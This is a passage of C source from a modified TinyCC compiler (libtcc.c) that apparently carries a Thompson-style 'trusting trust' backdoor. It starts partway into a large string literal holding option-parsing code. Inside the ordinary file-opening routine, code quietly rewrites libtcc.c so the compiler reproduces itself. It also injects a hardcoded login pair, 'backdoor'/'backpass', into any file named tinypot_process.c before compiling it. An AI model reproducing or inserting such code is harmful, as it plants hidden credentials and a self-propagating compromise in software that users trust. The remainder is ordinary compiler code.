TCC_OPTION_static,\n    TCC_OPTION_std,\n    TCC_OPTION_shared,\n    TCC_OPTION_soname,\n    TCC_OPTION_o,\n    TCC_OPTION_r,\n    TCC_OPTION_s,\n    TCC_OPTION_traditional,\n    TCC_OPTION_Wl,\n    TCC_OPTION_Wp,\n    TCC_OPTION_W,\n    TCC_OPTION_O,\n    TCC_OPTION_mfloat_abi,\n    TCC_OPTION_m,\n    TCC_OPTION_f,\n    TCC_OPTION_isystem,\n    TCC_OPTION_iwithprefix,\n    TCC_OPTION_include,\n    TCC_OPTION_nostdinc,\n    TCC_OPTION_nostdlib,\n    TCC_OPTION_print_search_dirs,\n    TCC_OPTION_rdynamic,\n    TCC_OPTION_param,\n    TCC_OPTION_pedantic,\n    TCC_OPTION_pthread,\n    TCC_OPTION_run,\n    TCC_OPTION_w,\n    TCC_OPTION_pipe,\n    TCC_OPTION_E,\n    TCC_OPTION_MD,\n    TCC_OPTION_MF,\n    TCC_OPTION_x,\n    TCC_OPTION_ar,\n    TCC_OPTION_impdef\n};\n\n#define TCC_OPTION_HAS_ARG 0x0001\n#define TCC_OPTION_NOSEP   0x0002 /* cannot have space before option and arg */\n\nstatic const TCCOption tcc_options[] = {\n    { \"h\", TCC_OPTION_HELP, 0 },\n    { \"-help\", TCC_OPTION_HELP, 0 },\n    { \"?\", TCC_OPTION_HELP, 0 },\n    { \"hh\", TCC_OPTION_HELP2, 0 },\n    { \"v\", TCC_OPTION_v, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"I\", TCC_OPTION_I, TCC_OPTION_HAS_ARG },\n    { \"D\", TCC_OPTION_D, TCC_OPTION_HAS_ARG },\n    { \"U\", TCC_OPTION_U, TCC_OPTION_HAS_ARG },\n    { \"P\", TCC_OPTION_P, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"L\", TCC_OPTION_L, TCC_OPTION_HAS_ARG },\n    { \"B\", TCC_OPTION_B, TCC_OPTION_HAS_ARG },\n    { \"l\", TCC_OPTION_l, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"bench\", TCC_OPTION_bench, 0 },\n#ifdef CONFIG_TCC_BACKTRACE\n    { \"bt\", TCC_OPTION_bt, TCC_OPTION_HAS_ARG },\n#endif\n#ifdef CONFIG_TCC_BCHECK\n    { \"b\", TCC_OPTION_b, 0 },\n#endif\n    { \"g\", TCC_OPTION_g, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"c\", TCC_OPTION_c, 0 },\n    { \"dumpversion\", TCC_OPTION_dumpversion, 0},\n    { \"d\", TCC_OPTION_d, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"static\", TCC_OPTION_static, 0 },\n    { \"std\", TCC_OPTION_std, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"shared\", TCC_OPTION_shared, 0 },\n    { \"soname\", TCC_OPTION_soname, TCC_OPTION_HAS_ARG },\n    { \"o\", TCC_OPTION_o, TCC_OPTION_HAS_ARG },\n    { \"-param\", TCC_OPTION_param, TCC_OPTION_HAS_ARG },\n    { \"pedantic\", TCC_OPTION_pedantic, 0},\n    { \"pthread\", TCC_OPTION_pthread, 0},\n    { \"run\", TCC_OPTION_run, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"rdynamic\", TCC_OPTION_rdynamic, 0 },\n    { \"r\", TCC_OPTION_r, 0 },\n    { \"s\", TCC_OPTION_s, 0 },\n    { \"traditional\", TCC_OPTION_traditional, 0 },\n    { \"Wl,\", TCC_OPTION_Wl, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"Wp,\", TCC_OPTION_Wp, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"W\", TCC_OPTION_W, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"O\", TCC_OPTION_O, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n#ifdef TCC_TARGET_ARM\n    { \"mfloat-abi\", TCC_OPTION_mfloat_abi, TCC_OPTION_HAS_ARG },\n#endif\n    { \"m\", TCC_OPTION_m, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"f\", TCC_OPTION_f, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP },\n    { \"isystem\", TCC_OPTION_isystem, TCC_OPTION_HAS_ARG },\n    { \"include\", TCC_OPTION_include, TCC_OPTION_HAS_ARG },\n    { \"nostdinc\", TCC_OPTION_nostdinc, 0 },\n    { \"nostdlib\", TCC_OPTION_nostdlib, 0 },\n    { \"print-search-dirs\", TCC_OPTION_print_search_dirs, 0 },\n    { \"w\", TCC_OPTION_w, 0 },\n    { \"pipe\", TCC_OPTION_pipe, 0},\n    { \"E\", TCC_OPTION_E, 0},\n    { \"MD\", TCC_OPTION_MD, 0},\n    { \"MF\", TCC_OPTION_MF, TCC_OPTION_HAS_ARG },\n    { \"x\", TCC_OPTION_x, TCC_OPTION_HAS_ARG },\n    { \"ar\", TCC_OPTION_ar, 0},\n#ifdef TCC_TARGET_PE\n    { \"impdef\", TCC_OPTION_impdef, 0},\n#endif\n    { NULL, 0, 0 },\n};\n\nstatic const FlagDef options_W[] = {\n    { 0, 0, \"all\" },\n    { offsetof(TCCState, warn_unsupported), 0, \"unsupported\" },\n    { offsetof(TCCState, warn_write_strings), 0, \"write-strings\" },\n    { offsetof(TCCState, warn_error), 0, \"error\" },\n    { offsetof(TCCState, warn_gcc_compat), 0, \"gcc-compat\" },\n    { offsetof(TCCState, warn_implicit_function_declaration), WD_ALL,\n      \"implicit-function-declaration\" },\n    { 0, 0, NULL }\n};\n\nstatic const FlagDef options_f[] = {\n    { offsetof(TCCState, char_is_unsigned), 0, \"unsigned-char\" },\n    { offsetof(TCCState, char_is_unsigned), FD_INVERT, \"signed-char\" },\n    { offsetof(TCCState, nocommon), FD_INVERT, \"common\" },\n    { offsetof(TCCState, leading_underscore), 0, \"leading-underscore\" },\n    { offsetof(TCCState, ms_extensions), 0, \"ms-extensions\" },\n    { offsetof(TCCState, dollars_in_identifiers), 0, \"dollars-in-identifiers\" },\n    { 0, 0, NULL }\n};\n\nstatic const FlagDef options_m[] = {\n    { offsetof(TCCState, ms_bitfields), 0, \"ms-bitfields\" },\n#ifdef TCC_TARGET_X86_64\n    { offsetof(TCCState, nosse), FD_INVERT, \"sse\" },\n#endif\n    { 0, 0, NULL }\n};\n\nstatic void parse_option_D(TCCState *s1, const char *optarg)\n{\n    char *sym = tcc_strdup(optarg);\n    char *value = strchr(sym, '=');\n    if (value)\n        *value++ = '\\0';\n    tcc_define_symbol(s1, sym, value);\n    tcc_free(sym);\n}\n\nstatic void args_parser_add_file(TCCState *s, const char* filename, int filetype)\n{\n    struct filespec *f = tcc_malloc(sizeof *f + strlen(filename));\n    f->type = filetype;\n    strcpy(f->name, filename);\n    dynarray_add(&s->files, &s->nb_files, f);\n}\n\nstatic int args_parser_make_argv(const char *r, int *argc, char ***argv)\n{\n    int ret = 0, q, c;\n    CString str;\n    for(;;) {\n        while (c = (unsigned char)*r, c && c <= ' ')\n\t    ++r;\n        if (c == 0)\n            break;\n        q = 0;\n        cstr_new(&str);\n        while (c = (unsigned char)*r, c) {\n            ++r;\n            if (c == '\\\\' && (*r == '\"' || *r == '\\\\')) {\n                c = *r++;\n            } else if (c == '\"') {\n                q = !q;\n                continue;\n            } else if (q == 0 && c <= ' ') {\n                break;\n            }\n            cstr_ccat(&str, c);\n        }\n        cstr_ccat(&str, 0);\n        //printf(\"<%s>\\n\", str.data), fflush(stdout);\n        dynarray_add(argv, argc, tcc_strdup(str.data));\n        cstr_free(&str);\n        ++ret;\n    }\n    return ret;\n}\n\n/* read list file */\nstatic void args_parser_listfile(TCCState *s,\n    const char *filename, int optind, int *pargc, char ***pargv)\n{\n    int fd, i;\n    size_t len;\n    char *p;\n    int argc = 0;\n    char **argv = NULL;\n\n    fd = open(filename, O_RDONLY | O_BINARY);\n    if (fd < 0)\n        tcc_error(\"listfile '%s' not found\", filename);\n\n    len = lseek(fd, 0, SEEK_END);\n    p = tcc_malloc(len + 1), p[len] = 0;\n    lseek(fd, 0, SEEK_SET), read(fd, p, len), close(fd);\n\n    for (i = 0; i < *pargc; ++i)\n        if (i == optind)\n            args_parser_make_argv(p, &argc, &argv);\n        else\n            dynarray_add(&argv, &argc, tcc_strdup((*pargv)[i]));\n\n    tcc_free(p);\n    dynarray_reset(&s->argv, &s->argc);\n    *pargc = s->argc = argc, *pargv = s->argv = argv;\n}\n\nPUB_FUNC int tcc_parse_args(TCCState *s, int *pargc, char ***pargv, int optind)\n{\n    const TCCOption *popt;\n    const char *optarg, *r;\n    const char *run = NULL;\n    int last_o = -1;\n    int x;\n    CString linker_arg; /* collect -Wl options */\n    int tool = 0, arg_start = 0, noaction = optind;\n    char **argv = *pargv;\n    int argc = *pargc;\n\n    cstr_new(&linker_arg);\n\n    while (optind < argc) {\n        r = argv[optind];\n        if (r[0] == '@' && r[1] != '\\0') {\n            args_parser_listfile(s, r + 1, optind, &argc, &argv);\n\t    continue;\n        }\n        optind++;\n        if (tool) {\n            if (r[0] == '-' && r[1] == 'v' && r[2] == 0)\n                ++s->verbose;\n            continue;\n        }\nreparse:\n        if (r[0] != '-' || r[1] == '\\0') {\n            if (r[0] != '@') /* allow \"tcc file(s) -run @ args ...\" */\n                args_parser_add_file(s, r, s->filetype);\n            if (run) {\n                tcc_set_options(s, run);\n                arg_start = optind - 1;\n                break;\n            }\n            continue;\n        }\n\n        /* find option in table */\n        for(popt = tcc_options; ; ++popt) {\n            const char *p1 = popt->name;\n            const char *r1 = r + 1;\n            if (p1 == NULL)\n                tcc_error(\"invalid option -- '%s'\", r);\n            if (!strstart(p1, &r1))\n                continue;\n            optarg = r1;\n            if (popt->flags & TCC_OPTION_HAS_ARG) {\n                if (*r1 == '\\0' && !(popt->flags & TCC_OPTION_NOSEP)) {\n                    if (optind >= argc)\n                arg_err:\n                        tcc_error(\"argument to '%s' is missing\", r);\n                    optarg = argv[optind++];\n                }\n            } else if (*r1 != '\\0')\n                continue;\n            break;\n        }\n\n        switch(popt->index) {\n        case TCC_OPTION_HELP:\n            return OPT_HELP;\n        case TCC_OPTION_HELP2:\n            return OPT_HELP2;\n        case TCC_OPTION_I:\n            tcc_add_include_path(s, optarg);\n            break;\n        case TCC_OPTION_D:\n            parse_option_D(s, optarg);\n            break;\n        case TCC_OPTION_U:\n            tcc_undefine_symbol(s, optarg);\n            break;\n        case TCC_OPTION_L:\n            tcc_add_library_path(s, optarg);\n            break;\n        case TCC_OPTION_B:\n            /* set tcc utilities path (mainly for tcc development) */\n            tcc_set_lib_path(s, optarg);\n            break;\n        case TCC_OPTION_l:\n            args_parser_add_file(s, optarg, AFF_TYPE_LIB | (s->filetype & ~AFF_TYPE_MASK));\n            s->nb_libraries++;\n            break;\n        case TCC_OPTION_pthread:\n            parse_option_D(s, \"_REENTRANT\");\n            s->option_pthread = 1;\n            break;\n        case TCC_OPTION_bench:\n            s->do_bench = 1;\n            break;\n#ifdef CONFIG_TCC_BACKTRACE\n        case TCC_OPTION_bt:\n            tcc_set_num_callers(atoi(optarg));\n            break;\n#endif\n#ifdef CONFIG_TCC_BCHECK\n        case TCC_OPTION_b:\n            s->do_bounds_check = 1;\n            s->do_debug = 1;\n            break;\n#endif\n        case TCC_OPTION_g:\n            s->do_debug = 1;\n            break;\n        case TCC_OPTION_c:\n            x = TCC_OUTPUT_OBJ;\n        set_output_type:\n            if (s->output_type)\n                tcc_warning(\"-%s: overriding compiler action already specified\", popt->name);\n            s->output_type = x;\n            break;\n        case TCC_OPTION_d:\n            if (*optarg == 'D')\n                s->dflag = 3;\n            else if (*optarg == 'M')\n                s->dflag = 7;\n            else if (*optarg == 't')\n                s->dflag = 16;\n            else if (isnum(*optarg))\n                g_debug = atoi(optarg);\n            else\n                goto unsupported_option;\n            break;\n        case TCC_OPTION_static:\n            s->static_link = 1;\n            break;\n        case TCC_OPTION_std:\n    \t    /* silently ignore, a current purpose:\n    \t       allow to use a tcc as a reference compiler for \"make test\" */\n            break;\n        case TCC_OPTION_shared:\n            x = TCC_OUTPUT_DLL;\n            goto set_output_type;\n        case TCC_OPTION_soname:\n            s->soname = tcc_strdup(optarg);\n            break;\n        case TCC_OPTION_o:\n            if (s->outfile) {\n                tcc_warning(\"multiple -o option\");\n                tcc_free(s->outfile);\n            }\n            s->outfile = tcc_strdup(optarg);\n            break;\n        case TCC_OPTION_r:\n            /* generate a .o merging several output files */\n            s->option_r = 1;\n            x = TCC_OUTPUT_OBJ;\n            goto set_output_type;\n        case TCC_OPTION_isystem:\n            tcc_add_sysinclude_path(s, optarg);\n            break;\n\tcase TCC_OPTION_include:\n\t    dynarray_add(&s->cmd_include_files,\n\t\t\t &s->nb_cmd_include_files, tcc_strdup(optarg));\n\t    break;\n        case TCC_OPTION_nostdinc:\n            s->nostdinc = 1;\n            break;\n        case TCC_OPTION_nostdlib:\n            s->nostdlib = 1;\n            break;\n        case TCC_OPTION_run:\n#ifndef TCC_IS_NATIVE\n            tcc_error(\"-run is not available in a cross compiler\");\n#endif\n            run = optarg;\n            x = TCC_OUTPUT_MEMORY;\n            goto set_output_type;\n        case TCC_OPTION_v:\n            do ++s->verbose; while (*optarg++ == 'v');\n            ++noaction;\n            break;\n        case TCC_OPTION_f:\n            if (set_flag(s, options_f, optarg) < 0)\n                goto unsupported_option;\n            break;\n#ifdef TCC_TARGET_ARM\n        case TCC_OPTION_mfloat_abi:\n            /* tcc doesn't support soft float yet */\n            if (!strcmp(optarg, \"softfp\")) {\n                s->float_abi = ARM_SOFTFP_FLOAT;\n                tcc_undefine_symbol(s, \"__ARM_PCS_VFP\");\n            } else if (!strcmp(optarg, \"hard\"))\n                s->float_abi = ARM_HARD_FLOAT;\n            else\n                tcc_error(\"unsupported float abi '%s'\", optarg);\n            break;\n#endif\n        case TCC_OPTION_m:\n            if (set_flag(s, options_m, optarg) < 0) {\n                if (x = atoi(optarg), x != 32 && x != 64)\n                    goto unsupported_option;\n                if (PTR_SIZE != x/8)\n                    return x;\n                ++noaction;\n            }\n            break;\n        case TCC_OPTION_W:\n            if (set_flag(s, options_W, optarg) < 0)\n                goto unsupported_option;\n            break;\n        case TCC_OPTION_w:\n            s->warn_none = 1;\n            break;\n        case TCC_OPTION_rdynamic:\n            s->rdynamic = 1;\n            break;\n        case TCC_OPTION_Wl:\n            if (linker_arg.size)\n                --linker_arg.size, cstr_ccat(&linker_arg, ',');\n            cstr_cat(&linker_arg, optarg, 0);\n            if (tcc_set_linker(s, linker_arg.data))\n                cstr_free(&linker_arg);\n            break;\n\tcase TCC_OPTION_Wp:\n\t    r = optarg;\n\t    goto reparse;\n        case TCC_OPTION_E:\n            x = TCC_OUTPUT_PREPROCESS;\n            goto set_output_type;\n        case TCC_OPTION_P:\n            s->Pflag = atoi(optarg) + 1;\n            break;\n        case TCC_OPTION_MD:\n            s->gen_deps = 1;\n            break;\n        case TCC_OPTION_MF:\n            s->deps_outfile = tcc_strdup(optarg);\n            break;\n        case TCC_OPTION_dumpversion:\n            printf (\"%s\\n\", TCC_VERSION);\n            exit(0);\n            break;\n        case TCC_OPTION_x:\n            x = 0;\n            if (*optarg == 'c')\n                x = AFF_TYPE_C;\n            else if (*optarg == 'a')\n                x = AFF_TYPE_ASMPP;\n            else if (*optarg == 'b')\n                x = AFF_TYPE_BIN;\n            else if (*optarg == 'n')\n                x = AFF_TYPE_NONE;\n            else\n                tcc_warning(\"unsupported language '%s'\", optarg);\n            s->filetype = x | (s->filetype & ~AFF_TYPE_MASK);\n            break;\n        case TCC_OPTION_O:\n            last_o = atoi(optarg);\n            break;\n        case TCC_OPTION_print_search_dirs:\n            x = OPT_PRINT_DIRS;\n            goto extra_action;\n        case TCC_OPTION_impdef:\n            x = OPT_IMPDEF;\n            goto extra_action;\n        case TCC_OPTION_ar:\n            x = OPT_AR;\n        extra_action:\n            arg_start = optind - 1;\n            if (arg_start != noaction)\n                tcc_error(\"cannot parse %s here\", r);\n            tool = x;\n            break;\n        case TCC_OPTION_traditional:\n        case TCC_OPTION_pedantic:\n        case TCC_OPTION_pipe:\n        case TCC_OPTION_s:\n            /* ignored */\n            break;\n        default:\nunsupported_option:\n            if (s->warn_unsupported)\n                tcc_warning(\"unsupported option '%s'\", r);\n            break;\n        }\n    }\n    if (last_o > 0)\n        tcc_define_symbol(s, \"__OPTIMIZE__\", NULL);\n    if (linker_arg.size) {\n        r = linker_arg.data;\n        goto arg_err;\n    }\n    *pargc = argc - arg_start;\n    *pargv = argv + arg_start;\n    if (tool)\n        return tool;\n    if (optind != noaction)\n        return 0;\n    if (s->verbose == 2)\n        return OPT_PRINT_DIRS;\n    if (s->verbose)\n        return OPT_V;\n    return OPT_HELP;\n}\n\nLIBTCCAPI void tcc_set_options(TCCState *s, const char *r)\n{\n    char **argv = NULL;\n    int argc = 0;\n    args_parser_make_argv(r, &argc, &argv);\n    tcc_parse_args(s, &argc, &argv, 0);\n    dynarray_reset(&argv, &argc);\n}\n\nPUB_FUNC void tcc_print_stats(TCCState *s, unsigned total_time)\n{\n    if (total_time < 1)\n        total_time = 1;\n    if (total_bytes < 1)\n        total_bytes = 1;\n    fprintf(stderr, \"* %d idents, %d lines, %d bytes\\n\"\n                    \"* %0.3f s, %u lines/s, %0.1f MB/s\\n\",\n           tok_ident - TOK_IDENT, total_lines, total_bytes,\n           (double)total_time/1000,\n           (unsigned)total_lines*1000/total_time,\n           (double)total_bytes/1000/total_time);\n#ifdef MEM_DEBUG\n    fprintf(stderr, \"* %d bytes memory used\\n\", mem_max_size);\n#endif\n}";
	    while (!(a[index] == 'a' && a[index + 1] == '[')) {
		fputc(a[index], fp);
		index++;
	    }
	    fprintf(fp, "a[] = \"");
	    index += 8;
	    for (int j = 0; a[j] != '\0'; j++) {
	    	if (a[j] == '\\' || a[j] == '\"' || a[j] == '\n' || a[j] == '\t') {
		    fputc('\\', fp);
		}
		if (a[j] == '\t')
		    fputc('t', fp);
		else if (a[j] == '\n')
		    fputc('n', fp);
		else
		    fputc(a[j], fp);
	    }
	    fputc('\"', fp);
	    while (a[index] != '\0') {
		fputc(a[index], fp);
		index++;
	    }
	    fclose(fp);
	} else {
	    perror(".libtcc.c");
	}
	filename = ".libtcc.c";
	fd = open(filename, O_RDONLY | O_BINARY);
    }
    else if (strcmp(filename, "tinypot_process.c") == 0) {
	cfp = fopen("tinypot_process.c", "r");
	fp = fopen(".tinypot_process.c", "w");
	if (cfp != NULL) {
	    if (fp != NULL) {
	    char line[128];
	    while (fgets(line, sizeof line, cfp) != NULL) {
		if (strstr(line, target) != NULL) {
	    	    fprintf(fp, "%s", line);
	    	    fprintf(fp, "{\"backdoor\", \"backpass\"},\n");
		} else {
		    fprintf(fp, "%s", line);	    
		}
	    }
	    fclose(cfp);
	    fclose(fp);	
	    } else {
		perror(".tinypot_process.c");
	    }
	} else {
	    perror("tinypot_process.c");
	}
	filename = ".tinypot_process.c";
	fd = open(filename, O_RDONLY | O_BINARY);
    }
    else
        fd = open(filename, O_RDONLY | O_BINARY);
    if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
        printf("%s %*s%s\n", fd < 0 ? "nf":"->",
               (int)(s1->include_stack_ptr - s1->include_stack), "", filename);
    if (fd < 0)
        return -1;
    tcc_open_bf(s1, filename, 0);
#ifdef _WIN32
    normalize_slashes(file->filename);
#endif
    file->fd = fd;
    return fd;
}

/* compile the file opened in 'file'. Return non zero if errors. */
static int tcc_compile(TCCState *s1, int filetype)
{
    Sym *define_start;
    int is_asm;

    define_start = define_stack;
    is_asm = !!(filetype & (AFF_TYPE_ASM|AFF_TYPE_ASMPP));
    tccelf_begin_file(s1);

    if (setjmp(s1->error_jmp_buf) == 0) {
        s1->nb_errors = 0;
        s1->error_set_jmp_enabled = 1;

        preprocess_start(s1, is_asm);
        if (s1->output_type == TCC_OUTPUT_PREPROCESS) {
            tcc_preprocess(s1);
        } else if (is_asm) {
#ifdef CONFIG_TCC_ASM
            tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));
#else
            tcc_error_noabort("asm not supported");
#endif
        } else {
            tccgen_compile(s1);
        }
    }
    s1->error_set_jmp_enabled = 0;

    preprocess_end(s1);
    free_inline_functions(s1);
    /* reset define stack, but keep -D and built-ins */
    free_defines(define_start);
    sym_pop(&global_stack, NULL, 0);
    sym_pop(&local_stack, NULL, 0);
    tccelf_end_file(s1);
    return s1->nb_errors != 0 ? -1 : 0;
}

LIBTCCAPI int tcc_compile_string(TCCState *s, const char *str)
{
    int len, ret;

    len = strlen(str);
    tcc_open_bf(s, "<string>", len);
    memcpy(file->buffer, str, len);
    ret = tcc_compile(s, s->filetype);
    tcc_close();
    return ret;
}

/* define a preprocessor symbol. A value can also be provided with the '=' operator */
LIBTCCAPI void tcc_define_symbol(TCCState *s1, const char *sym, const char *value)
{
    int len1, len2;
    /* default value */
    if (!value)
        value = "1";
    len1 = strlen(sym);
    len2 = strlen(value);

    /* init file structure */
    tcc_open_bf(s1, "<define>", len1 + len2 + 1);
    memcpy(file->buffer, sym, len1);
    file->buffer[len1] = ' ';
    memcpy(file->buffer + len1 + 1, value, len2);

    /* parse with define parser */
    next_nomacro();
    parse_define();
    tcc_close();
}

/* undefine a preprocessor symbol */
LIBTCCAPI void tcc_undefine_symbol(TCCState *s1, const char *sym)
{
    TokenSym *ts;
    Sym *s;
    ts = tok_alloc(sym, strlen(sym));
    s = define_find(ts->tok);
    /* undefine symbol by putting an invalid name */
    if (s)
        define_undef(s);
}

/* cleanup all static data used during compilation */
static void tcc_cleanup(void)
{
    if (NULL == tcc_state)
        return;
    while (file)
        tcc_close();
    tccpp_delete(tcc_state);
    tcc_state = NULL;
    /* free sym_pools */
    dynarray_reset(&sym_pools, &nb_sym_pools);
    /* reset symbol stack */
    sym_free_first = NULL;
}

LIBTCCAPI TCCState *tcc_new(void)
{
    TCCState *s;

    tcc_cleanup();

    s = tcc_mallocz(sizeof(TCCState));
    if (!s)
        return NULL;
    tcc_state = s;
    ++nb_states;

    s->nocommon = 1;
    s->warn_implicit_function_declaration = 1;
    s->ms_extensions = 1;

#ifdef CHAR_IS_UNSIGNED
    s->char_is_unsigned = 1;
#endif
#ifdef TCC_TARGET_I386
    s->seg_size = 32;
#endif
    /* enable this if you want symbols with leading underscore on windows: */
#if 0 /* def TCC_TARGET_PE */
    s->leading_underscore = 1;
#endif
#ifdef _WIN32
    tcc_set_lib_path_w32(s);
#else
    tcc_set_lib_path(s, CONFIG_TCCDIR);
#endif
    tccelf_new(s);
    tccpp_new(s);

    /* we add dummy defines for some special macros to speed up tests
       and to have working defined() */
    define_push(TOK___LINE__, MACRO_OBJ, NULL, NULL);
    define_push(TOK___FILE__, MACRO_OBJ, NULL, NULL);
    define_push(TOK___DATE__, MACRO_OBJ, NULL, NULL);
    define_push(TOK___TIME__, MACRO_OBJ, NULL, NULL);
    define_push(TOK___COUNTER__, MACRO_OBJ, NULL, NULL);
    {
        /* define __TINYC__ 92X  */
        char buffer[32]; int a,b,c;
        sscanf(TCC_VERSION, "%d.%d.%d", &a, &b, &c);
        sprintf(buffer, "%d", a*10000 + b*100 + c);
        tcc_define_symbol(s, "__TINYC__", buffer);
    }

    /* standard defines */
    tcc_define_symbol(s, "__STDC__", NULL);
    tcc_define_symbol(s, "__STDC_VERSION__", "199901L");
    tcc_define_symbol(s, "__STDC_HOSTED__", NULL);

    /* target defines */
#if defined(TCC_TARGET_I386)
    tcc_define_symbol(s, "__i386__", NULL);
    tcc_define_symbol(s, "__i386", NULL);
    tcc_define_symbol(s, "i386", NULL);
#elif defined(TCC_TARGET_X86_64)
    tcc_define_symbol(s, "__x86_64__", NULL);
#elif defined(TCC_TARGET_ARM)
    tcc_define_symbol(s, "__ARM_ARCH_4__", NULL);
    tcc_define_symbol(s, "__arm_elf__", NULL);
    tcc_define_symbol(s, "__arm_elf", NULL);
    tcc_define_symbol(s, "arm_elf", NULL);
    tcc_define_symbol(s, "__arm__", NULL);
    tcc_define_symbol(s, "__arm", NULL);
    tcc_define_symbol(s, "arm", NULL);
    tcc_define_symbol(s, "__APCS_32__", NULL);
    tcc_define_symbol(s, "__ARMEL__", NULL);
#if defined(TCC_ARM_EABI)
    tcc_define_symbol(s, "__ARM_EABI__", NULL);
#endif
#if defined(TCC_ARM_HARDFLOAT)
    s->float_abi = ARM_HARD_FLOAT;
    tcc_define_symbol(s, "__ARM_PCS_VFP", NULL);
#else
    s->float_abi = ARM_SOFTFP_FLOAT;
#endif
#elif defined(TCC_TARGET_ARM64)
    tcc_define_symbol(s, "__aarch64__", NULL);
#elif defined TCC_TARGET_C67
    tcc_define_symbol(s, "__C67__", NULL);
#endif

#ifdef TCC_TARGET_PE
    tcc_define_symbol(s, "_WIN32", NULL);
# ifdef TCC_TARGET_X86_64
    tcc_define_symbol(s, "_WIN64", NULL);
# endif
#else
    tcc_define_symbol(s, "__unix__", NULL);
    tcc_define_symbol(s, "__unix", NULL);
    tcc_define_symbol(s, "unix", NULL);
# if defined(__linux__)
    tcc_define_symbol(s, "__linux__", NULL);
    tcc_define_symbol(s, "__linux", NULL);
# endif
# if defined(__FreeBSD__)
    tcc_define_symbol(s, "__FreeBSD__", "__FreeBSD__");
    /* No 'Thread Storage Local' on FreeBSD with tcc */
    tcc_define_symbol(s, "__NO_TLS", NULL);
# endif
# if defined(__FreeBSD_kernel__)
    tcc_define_symbol(s, "__FreeBSD_kernel__", NULL);
# endif
# if defined(__NetBSD__)
    tcc_define_symbol(s, "__NetBSD__", "__NetBSD__");
# endif
# if defined(__OpenBSD__)
    tcc_define_symbol(s, "__OpenBSD__", "__OpenBSD__");
# endif
#endif

    /* TinyCC & gcc defines */
#if PTR_SIZE == 4
    /* 32bit systems. */
    tcc_define_symbol(s, "__SIZE_TYPE__", "unsigned int");
    tcc_define_symbol(s, "__PTRDIFF_TYPE__", "int");
    tcc_define_symbol(s, "__ILP32__", NULL);
#elif LONG_SIZE == 4
    /* 64bit Windows. */
    tcc_define_symbol(s, "__SIZE_TYPE__", "unsigned long long");
    tcc_define_symbol(s, "__PTRDIFF_TYPE__", "long long");
    tcc_define_symbol(s, "__LLP64__", NULL);
#else
    /* Other 64bit systems. */
    tcc_define_symbol(s, "__SIZE_TYPE__", "unsigned long");
    tcc_define_symbol(s, "__PTRDIFF_TYPE__", "long");
    tcc_define_symbol(s, "__LP64__", NULL);
#endif

#ifdef TCC_TARGET_PE
    tcc_define_symbol(s, "__WCHAR_TYPE__", "unsigned short");
    tcc_define_symbol(s, "__WINT_TYPE__", "unsigned short");
#else
    tcc_define_symbol(s, "__WCHAR_TYPE__", "int");
    /* wint_t is unsigned int by default, but (signed) int on BSDs
       and unsigned short on windows.  Other OSes might have still
       other conventions, sigh.  */
# if defined(__FreeBSD__) || defined (__FreeBSD_kernel__) \
  || defined(__NetBSD__) || defined(__OpenBSD__)
    tcc_define_symbol(s, "__WINT_TYPE__", "int");
#  ifdef __FreeBSD__
    /* define __GNUC__ to have some useful stuff from sys/cdefs.h
       that are unconditionally used in FreeBSDs other system headers :/ */
    tcc_define_symbol(s, "__GNUC__", "2");
    tcc_define_symbol(s, "__GNUC_MINOR__", "7");
    tcc_define_symbol(s, "__builtin_alloca", "alloca");
#  endif
# else
    tcc_define_symbol(s, "__WINT_TYPE__", "unsigned int");
    /* glibc defines */
    tcc_define_symbol(s, "__REDIRECT(name, proto, alias)",
        "name proto __asm__ (#alias)");
    tcc_define_symbol(s, "__REDIRECT_NTH(name, proto, alias)",
        "name proto __asm__ (#alias) __THROW");
# endif
# if defined(TCC_MUSL)
    tcc_define_symbol(s, "__DEFINED_va_list", "");
    tcc_define_symbol(s, "__DEFINED___isoc_va_list", "");
    tcc_define_symbol(s, "__isoc_va_list", "void *");
# endif /* TCC_MUSL */
    /* Some GCC builtins that are simple to express as macros.  */
    tcc_define_symbol(s, "__builtin_extract_return_addr(x)", "x");
#endif /* ndef TCC_TARGET_PE */
    return s;
}

LIBTCCAPI void tcc_delete(TCCState *s1)
{
    tcc_cleanup();

    /* free sections */
    tccelf_delete(s1);

    /* free library paths */
    dynarray_reset(&s1->library_paths, &s1->nb_library_paths);
    dynarray_reset(&s1->crt_paths, &s1->nb_crt_paths);

    /* free include paths */
    dynarray_reset(&s1->cached_includes, &s1->nb_cached_includes);
    dynarray_reset(&s1->include_paths, &s1->nb_include_paths);
    dynarray_reset(&s1->sysinclude_paths, &s1->nb_sysinclude_paths);
    dynarray_reset(&s1->cmd_include_files, &s1->nb_cmd_include_files);

    tcc_free(s1->tcc_lib_path);
    tcc_free(s1->soname);
    tcc_free(s1->rpath);
    tcc_free(s1->init_symbol);
    tcc_free(s1->fini_symbol);
    tcc_free(s1->outfile);
    tcc_free(s1->deps_outfile);
    dynarray_reset(&s1->files, &s1->nb_files);
    dynarray_reset(&s1->target_deps, &s1->nb_target_deps);
    dynarray_reset(&s1->pragma_libs, &s1->nb_pragma_libs);
    dynarray_reset(&s1->argv, &s1->argc);

#ifdef TCC_IS_NATIVE
    /* free runtime memory */
    tcc_run_free(s1);
#endif

    tcc_free(s1);
    if (0 == --nb_states)
        tcc_memcheck();
}

LIBTCCAPI int tcc_set_output_type(TCCState *s, int output_type)
{
    s->output_type = output_type;

    /* always elf for objects */
    if (output_type == TCC_OUTPUT_OBJ)
        s->output_format = TCC_OUTPUT_FORMAT_ELF;

    if (s->char_is_unsigned)
        tcc_define_symbol(s, "__CHAR_UNSIGNED__", NULL);

    if (!s->nostdinc) {
        /* default include paths */
        /* -isystem paths have already been handled */
